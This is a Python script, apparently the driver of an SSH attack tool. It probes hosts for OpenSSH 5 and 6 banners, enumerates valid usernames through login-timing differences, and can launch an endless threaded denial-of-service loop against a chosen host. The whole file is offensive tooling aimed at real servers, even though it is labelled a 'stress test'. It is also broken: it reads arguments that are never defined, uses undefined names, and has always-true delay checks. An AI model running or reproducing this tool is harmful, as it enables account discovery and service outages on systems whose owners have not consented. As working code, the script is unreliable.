from osufunc import *
import argparse
import time
import timeit

try:
    from IPy import IP
except ImportError:
    print("Install IPy module. apt-get install python-ipy.")


def main():
    parse = argparse.ArgumentParser(description='SSH Stress Test Script')
    host_group = parse.add_mutually_exclusive_group(required=True)
    user_group = parse.add_mutually_exclusive_group(required=True)
    host_group.add_argument('-H', action='store', dest='host', help='Host Ip or CIDR netblock.')
    host_group.add_argument('-k', action='store', dest='hfile', help='Host list in a file.')
    host_group.add_argument('-f', action='store', dest='fqdn', help='FQDN to attack.')
    parse.add_argument('-p', action='store', dest='port', default='22', help='Host port.')
    user_group.add_argument('-L', action='store', dest='ufile', help='Username list file.')
    user_group.add_argument('-U', action='store', dest='user', help='Only use a single username.')
    parse.add_argument('-d', action='store', dest='delay',
                       help='Time delay fixed in seconds. If not, delay time is calculated.')
    parse.add_argument('--dos', action='store', dest='dos', default='no', help='Try to make a DOS attack (default no).')
    parse.add_argument('-t', action='store', dest='threads', default='5',
                       help='Threads for the DOS attack (default 5).')
    print()
    start_time = time.time()
    argus = parse.parse_args()

    hosts = []
    numhost = 0
    vers = argus.vers

    if argus.delay is not None:
        defTime = int(argus.delay)
        print("[+] Using a time delay of " + str(defTime) + " seconds.")

    if argus.host is not None:
        host = argus.host
        try:
            IP(host)
        except ValueError:
            print("[-] Invalid host address.")
            exit(1)
        hosts.append(host)
        numhost = numhost + 1
    if argus.fqdn is not None:
        try:
            fqdn = argus.fqdn
            host = socket.gethostbyname(fqdn)
            hosts.append(host)
            numhost = numhost + 1
        except socket.gaierror as err:
            print("[-] Cannot resolve hostname: " + fqdn)
            exit(1)
    if argus.hfile is not None:
        try:
            hostFile = open(argus.hfile, 'r')
        except IOError:
            print("[-] The file %s doesn't exist." % argus.hfile)
            exit(1)
        for line in hostFile.readlines():
            line = line.split("\n")
            host = line[0]
            try:
                IP(host)
            except ValueError:
                print("[-] Invalid host address.")
                exit(1)
            hosts.append(host)
            numhost = numhost + 1

    port = argus.port
    dos = argus.dos
    if dos == 'yes' and len(hosts) != 1:
        print("[-] DOS option it's only valid for one host.")
        exit(1)

    threads = int(argus.threads)
    print("[+] " + str(numhost) + " host(s). It's better a previous fast scan with nmap ...")
    print()
    hoststate = {}
    userfdos = None
    numop = 0
    start_time = time.time()
    nt = 1
    for ip in hosts:
        print("[+] " + "(" + str(nt) + "/" + str(len(hosts)) + ")" + " Trying " + ip + " ...", )
        state = prevScann(ip, port)
        nt = nt + 1
        if state == 'open':
            numop = numop + 1
        hoststate[ip] = state
    if numop > 0:
        print()
        print('[+] Found ' + str(numop) + ' host with port ' + port + ' open.')
        print()
    else:
        print()
        print("[-] No hosts with port " + port + " open.")
        print("[-] Nothing to do.")
        exit(1)
    for ip in hosts:
        if hoststate[ip] == 'open':
            host = ip
            if argus.ufile is not None:
                try:
                    userFile = open(argus.ufile, 'r')
                except IOError:
                    print("[-] The file %s doesn't exist." % (argus.ufile))
                    exit(1)
                foundUser = []
                print()
                if vers == 'yes':

                    banner = sshBanner(host, port)
                    bannervuln = ['OpenSSH 5', 'OpenSSH 6']
                    if banner[0:9] in bannervuln:
                        print("[++] This version is perhaps vulnerable, we continue with the bruteforce attack ...")
                        print()
                        print('===============================================================================')
                        if argus.delay is None:
                            delay = dummySSH(host, port, length)
                            if delay is not None or delay != 0:
                                defTime = delay * 10
                                print("[+] Using a delay of " + str(defTime) + " seconds.")
                            else:
                                defTime = 20
                                print("[-] Impossible to determine the delay time. Using " + str(defTime) + " seconds.")
                        userNames = prepareUserNames(userFile, vari)
                        for userName in userNames:
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            fUser = sshTime(host, port, userName, sock, defTime, length)
                            if fUser != -1 and fUser is not None:
                                foundUser.append(fUser)
                            sock.close()
                        print_success(foundUser, banner)
                        for entry in foundUser:
                            userfdos = entry[0]
                            if argus.outp != None:
                                fileOutput.write(
                                    entry[0] + '@' + host + ' ' + banner + ' (' + str(entry[3]) + ' seconds' + ')\n')
                    else:
                        print("[-] This version is not vulnerable.")
                        print("[-] Nothing to do.")
                else:
                    banner = sshBanner(host, port)

                    if argus.delay == None:
                        delay = dummySSH(host, port, length)
                        if delay != None or delay != 0:
                            defTime = delay * 10
                            print("[+] Using a delay of " + str(defTime) + " seconds.")
                        else:
                            defTime = 20
                            print("[-] Impossible to determine the delay time. Using " + str(defTime) + " seconds.")

                    userNames = prepareUserNames(userFile, vari)
                    for userName in userNames:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        fUser = sshTime(host, port, userName, sock, defTime, length)
                        if fUser != -1 and fUser != None:
                            foundUser.append(fUser)
                        sock.close()
                    print_success(foundUser, banner)
                    for entry in foundUser:
                        userfdos = entry[0]
                        if argus.outp != None:
                            fileOutput.write(
                                entry[0] + '@' + host + ' ' + banner + ' (' + str(entry[3]) + ' seconds' + ')\n')

            else:
                print()
                banner = sshBanner(host, port)
                print()
                foundUser = []
                user = argus.user

                if vers == 'yes':
                    bannervuln = ['OpenSSH 5', 'OpenSSH 6']
                    if banner[0:9] in bannervuln:
                        print("[++] This version is perhaps vulnerable, we continue with the bruteforce attack ...")
                        print()
                        print('===============================================================================')
                        if argus.delay == None:
                            delay = dummySSH(host, port, length)
                            if delay != None or delay != 0:
                                defTime = delay * 10
                                print("[+] Using a delay of " + str(defTime) + " seconds.")
                            else:
                                defTime = 20
                                print("[-] Impossible to determine the delay time. Using " + str(defTime) + " seconds.")
                        if vari == 'yes':
                            userNames = createUserNameVariationsFor(user)
                            userNames = list(set(userNames))
                            for userName in userNames:
                                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                fUser = sshTime(host, port, userName, sock, defTime, length)
                                if fUser != -1 and fUser != None:
                                    foundUser.append(fUser)
                                sock.close()
                        if vari == 'no':
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            fUser = sshTime(host, port, user, sock, defTime, length)
                            if fUser != -1 and fUser is not None:
                                foundUser.append(fUser)
                            sock.close()
                        print_success(foundUser, banner)
                        for entry in foundUser:
                            userfdos = entry[0]
                            if argus.outp != None:
                                fileOutput.write(
                                    entry[0] + '@' + host + ' ' + banner + ' (' + str(entry[3]) + ' seconds' + ')\n')
                    else:
                        print("[-] This version is not vulnerable.")
                        print("[-] Nothing to do.")
                else:
                    if vari == 'yes':

                        if argus.delay is None:
                            delay = dummySSH(host, port, length)
                            if delay is not None or delay != 0:
                                defTime = delay * 10
                                print("[+] Using a delay of " + str(defTime) + " seconds.")
                            else:
                                defTime = 20
                                print("[-] Impossible to determine the delay time. Using " + str(defTime) + " seconds.")

                        userNames = createUserNameVariationsFor(user)
                        userNames = list(set(userNames))
                        for userName in userNames:
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            fUser = sshTime(host, port, userName, sock, defTime, length)
                            if fUser != -1 and fUser != None:
                                foundUser.append(fUser)
                            sock.close()
                    if vari == 'no':

                        if argus.delay == None:
                            delay = dummySSH(host, port, length)
                            if delay != None or delay != 0:
                                defTime = delay * 10
                                print("[+] Using a delay of " + str(defTime) + " seconds.")
                            else:
                                defTime = 20
                                print("[-] Impossible to determine the delay time. Using " + str(defTime) + " seconds.")

                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        fUser = sshTime(host, port, user, sock, defTime, length)
                        if fUser != -1 and fUser != None:
                            foundUser.append(fUser)
                        sock.close()
                    print_success(foundUser, banner)
                    for entry in foundUser:
                        userfdos = entry[0]
                        if argus.outp != None:
                            fileOutput.write(
                                entry[0] + '@' + host + ' ' + banner + ' (' + str(entry[3]) + ' seconds' + ')\n')
            if dos == 'yes':
                if userfdos is not None:

                    print()
                    print("Trying to establish a DOS condition with user " + userfdos + " and " + str(
                        threads) + " threads ...")
                    print("If you see some error message probably the attack has succeeded. Press [Ctrl-Z] to stop.")

                    while 1:
                        for att in range(threads):
                            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                            t = Thread(target=sshDos, args=(host, port, userfdos, sock, length))
                            try:
                                t.start()
                            except KeyboardInterrupt:
                                print("Bye !!")
                        time.sleep(10)
                else:
                    print("No user found. Imposible to establish a DOS condition.")
                    exit(1)
    print("\nFinished in", time.time() - start_time, "seconds\n")
